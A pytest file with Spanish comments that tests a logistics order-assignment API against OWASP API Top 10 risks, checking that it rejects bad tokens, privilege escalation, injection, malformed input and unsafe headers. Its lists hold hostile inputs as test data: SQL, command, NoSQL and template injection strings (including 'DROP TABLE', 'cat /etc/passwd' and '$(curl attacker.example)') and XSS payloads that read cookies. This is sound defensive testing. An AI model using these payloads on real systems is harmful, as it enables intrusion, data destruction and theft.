"""
PARTE 5 - EJERCICIO B (5.3): pruebas de SEGURIDAD de ``POST /api/v1/orders/assign``.

Son pruebas automatizadas "de caja gris" basadas en OWASP API Security Top 10.
Complementan (no reemplazan) al escaneo DAST con OWASP ZAP y al pentest manual
con Burp Suite (ver docs/).

Bloques:
    1. Autenticación y autorización (tokens expirados, roles, escalamiento de privilegios).
    2. Inyección (SQL, NoSQL, comandos).
    3. Validación de entrada (payloads malformados, XSS, tamaños).
    4. Headers de seguridad (CORS, CSP, rate limiting).
"""

import pytest

from framework import config
from framework.api.payloads import assign_payload

pytestmark = [pytest.mark.security, pytest.mark.regression]


# =============================================================================
# 1. Autenticación y autorización
# =============================================================================
@pytest.mark.critical
def test_expired_token_is_rejected(anonymous_api):
    """Token con firma válida pero EXPIRADO -> 401."""
    expired = anonymous_api.expired_token(config.SUPERVISOR_USER)
    payload = assign_payload(orderId=anonymous_api.create_test_order())
    response = anonymous_api.assign_order(payload, token=expired)
    assert response.status_code == 401
    assert "expirado" in response.json()["error"]["message"]


@pytest.mark.critical
def test_operator_role_cannot_assign_orders(anonymous_api):
    """Rol no autorizado (OPERATOR) -> 403. Un operador no debe auto-asignarse pedidos."""
    anonymous_api.login(config.OPERATOR_USER, config.OPERATOR_PASSWORD)
    response = anonymous_api.assign_order(assign_payload(orderId=anonymous_api.create_test_order()))
    assert response.status_code == 403


@pytest.mark.critical
def test_supervisor_cannot_assign_in_other_warehouse(anonymous_api):
    """Escalamiento HORIZONTAL de privilegios: supervisor de WH-01 intenta operar WH-05 -> 403."""
    anonymous_api.login("supervisor.wh01", "Sup3rvisor!2025")
    response = anonymous_api.assign_order(assign_payload(orderId=anonymous_api.create_test_order()))
    assert response.status_code == 403


def test_privilege_escalation_via_extra_fields_is_rejected(api):
    """Escalamiento VERTICAL vía 'mass assignment': enviar campos extra como role/status -> 400."""
    payload = assign_payload(orderId=api.create_test_order())
    payload.update({"role": "ADMIN", "status": "DELIVERED", "assignedBy": "admin"})
    assert api.assign_order(payload).status_code == 400


def test_login_does_not_reveal_which_users_exist(anonymous_api):
    """Usuario inexistente y contraseña incorrecta devuelven la MISMA respuesta (anti-enumeración)."""
    unknown = anonymous_api.login("usuario.que.no.existe", "x")
    wrong_password = anonymous_api.login(config.SUPERVISOR_USER, "incorrecta")
    locked = anonymous_api.login("supervisor.locked", "Sup3rvisor!2025")
    assert unknown.status_code == wrong_password.status_code == locked.status_code == 401
    assert unknown.json()["error"]["message"] == wrong_password.json()["error"]["message"]


# =============================================================================
# 2. Inyección
# =============================================================================
INJECTION_PAYLOADS = [
    "ORD-2025-007841' OR '1'='1",                 # SQL injection clásica
    "ORD-2025-007841'; DROP TABLE orders;--",     # SQL injection destructiva
    "ORD-2025-007841 UNION SELECT * FROM users",  # SQL UNION
    "ORD-2025-007841; ls -la /",                  # command injection
    "ORD-2025-007841 && cat /etc/passwd",         # command injection
    "$(curl attacker.example)",                   # command substitution
    "{{7*7}}",                                    # template injection
]


@pytest.mark.parametrize("malicious", INJECTION_PAYLOADS)
@pytest.mark.parametrize("field", ["orderId", "operatorId", "warehouseId"])
def test_injection_strings_are_rejected_by_validation(api, field, malicious):
    """
    Cadenas de inyección en cualquier campo -> 400.
    Nunca 500 (indicaría que el texto llegó a la base de datos/shell) ni 201.
    """
    response = api.assign_order(assign_payload(**{field: malicious}))
    assert response.status_code == 400
    assert "Traceback" not in response.text and "SQL" not in response.text


@pytest.mark.parametrize(
    "nosql_value",
    [{"$ne": None}, {"$gt": ""}, {"$where": "sleep(5000)"}, ["ORD-2025-007841"]],
    ids=["$ne", "$gt", "$where", "array"],
)
def test_nosql_operator_injection_is_rejected(api, nosql_value):
    """NoSQL injection (operadores tipo MongoDB/Firestore en lugar de texto) -> 400."""
    assert api.assign_order(assign_payload(orderId=nosql_value)).status_code == 400


# =============================================================================
# 3. Validación de entrada
# =============================================================================
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "\"><svg/onload=alert(1)>",
]


@pytest.mark.parametrize("xss", XSS_PAYLOADS)
def test_xss_payloads_are_rejected_and_not_reflected(api, xss):
    """XSS en campos de texto -> 400 y el payload NO se refleja en la respuesta."""
    response = api.assign_order(assign_payload(operatorId=xss))
    assert response.status_code == 400
    assert xss not in response.text
    assert response.headers["content-type"].startswith("application/json")


@pytest.mark.parametrize(
    "raw_body",
    [
        '{"orderId": "ORD-2025-007841",',
        "not json at all",
        "",
        "null",
        "[]",
        '{"orderId": ' + "1" * 5000 + "}",
    ],
    ids=["json-cortado", "texto", "vacio", "null", "array", "numero-gigante"],
)
def test_malformed_payloads_return_400_without_leaking_internals(api, raw_body):
    """JSON malformado -> 400 controlado, sin stack trace."""
    response = api.http.post(
        "/api/v1/orders/assign", content=raw_body,
        headers={**api.auth_headers(), "Content-Type": "application/json"},
    )
    assert response.status_code == 400
    assert "Traceback" not in response.text


def test_oversized_field_is_rejected(api):
    """Campo de 10.000 caracteres -> 400 (límite de longitud)."""
    assert api.assign_order(assign_payload(orderId="A" * 10_000)).status_code == 400


def test_wrong_content_type_is_rejected(api):
    """Content-Type distinto de JSON (p. ej. form o XML) -> 415."""
    response = api.http.post(
        "/api/v1/orders/assign", content="<order/>",
        headers={**api.auth_headers(), "Content-Type": "application/xml"},
    )
    assert response.status_code == 415


# =============================================================================
# 4. Headers de seguridad, CORS y rate limiting
# =============================================================================
@pytest.mark.critical
def test_security_headers_are_present(api):
    """Toda respuesta incluye CSP, nosniff, anti-clickjacking, HSTS y no-store."""
    headers = api.assign_order(assign_payload(orderId=api.create_test_order())).headers
    assert "default-src 'self'" in headers["Content-Security-Policy"]
    assert "frame-ancestors 'none'" in headers["Content-Security-Policy"]
    assert headers["X-Content-Type-Options"] == "nosniff"
    assert headers["X-Frame-Options"] == "DENY"
    assert "max-age=" in headers["Strict-Transport-Security"]
    assert headers["Cache-Control"] == "no-store"
    # No revelar la tecnología del servidor (ayudaría a un atacante a elegir exploits).
    assert "x-powered-by" not in headers


def test_cors_allows_only_trusted_origins(api):
    """
    CORS: el origen del Centro de Control está permitido; un sitio malicioso no.
    Se usa una petición "preflight" (OPTIONS), que es lo que hace el navegador.
    """
    def preflight(origin: str):
        return api.http.options("/api/v1/orders/assign", headers={
            "Origin": origin, "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Authorization,Content-Type",
        })

    trusted = preflight("https://control.logitrack.example")
    evil = preflight("https://evil.example")
    assert trusted.headers.get("access-control-allow-origin") == "https://control.logitrack.example"
    assert "access-control-allow-origin" not in evil.headers
    # Nunca se debe permitir "*" en una API autenticada.
    assert trusted.headers.get("access-control-allow-origin") != "*"


def test_rate_limiting_returns_429_with_retry_after(anonymous_api):
    """
    Rate limiting: tras superar el límite por minuto -> 429 + Retry-After.
    Usa un usuario dedicado (sup.ratelimit) para no afectar a las demás pruebas.
    """
    anonymous_api.login("sup.ratelimit", "Sup3rvisor!2025")
    statuses = []
    for _ in range(400):                      # el límite por defecto es 300/min
        response = anonymous_api.list_orders()
        statuses.append(response.status_code)
        if response.status_code == 429:
            break
    assert statuses[-1] == 429, "No se aplicó rate limiting tras 400 peticiones"
    assert int(response.headers["Retry-After"]) > 0
